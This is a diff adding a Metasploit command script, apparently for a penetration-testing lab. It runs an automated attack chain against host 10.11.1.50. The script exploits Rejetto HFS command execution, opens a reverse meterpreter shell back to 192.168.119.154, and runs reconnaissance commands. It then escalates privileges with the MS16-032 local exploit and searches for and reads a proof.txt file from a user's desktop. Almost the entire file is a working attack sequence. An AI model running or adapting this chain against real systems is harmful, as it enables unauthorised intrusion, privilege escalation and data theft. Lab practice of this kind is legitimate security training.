@@ -1,0 +1,73 @@
+#help;
+# perform nmap scan
+
+# disabled for now
+db_nmap; set delay_to_observe 1; set dst_ip 10.11.1.50;  options; set mode single; set rport 9505; run;
+
+# exploit rejetto command execution
+exploit/windows/http/rejetto_hfs_exec;
+set delay_to_observe 1;
+set rhosts 10.11.1.50;
+set rport 9505;
+set EXTRA_METASPLOIT_SLEEP 0;
+
+set lport <REVSHELL_PORT>
+set lhost 192.168.119.154;
+
+set srvport <SRV_PORT>
+set srvhost 192.168.119.154
+
+run;
+# this should now wait for sessions
+# list sessions
+sessions;
+
+# execute whoami on the session
+execute_meterpreter_command_in_session; set command getuid; run;
+
+# execute sysinfo on the session
+execute_meterpreter_command_in_session;
+set command sysinfo;
+run;
+
+# execute sysinfo on the session
+execute_meterpreter_command_in_session;
+set command dir;
+run;
+
+# try to find the proof.txt file
+execute_meterpreter_command_in_session;
+set command search -d C:\\Users -f proof.txt;
+run;
+
+# attempt to escalate privileges
+exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set delay_to_observe 1
+set EXTRA_METASPLOIT_SLEEP 0
+set lhost 192.168.119.154
+set lport <REVSHELL_PORT>
+set session <METASPLOIT_SESSION_ID>
+set payload windows/meterpreter/reverse_tcp
+set target 0
+run;
+
+# list sessions again
+sessions;
+
+# execute whoami on the session
+execute_meterpreter_command_in_session; set command getuid; run;
+
+# try to find the proof.txt file
+execute_meterpreter_command_in_session; set command search -d C:\\Users -f proof.txt; run;
+
+execute_meterpreter_command_in_session; set command cat C:\\Users\\alice\\Desktop\\proof.txt; run;
+
+# list services
+services
+
+# list hosts
+hosts;
+# get status
+#status;
+
+exit;
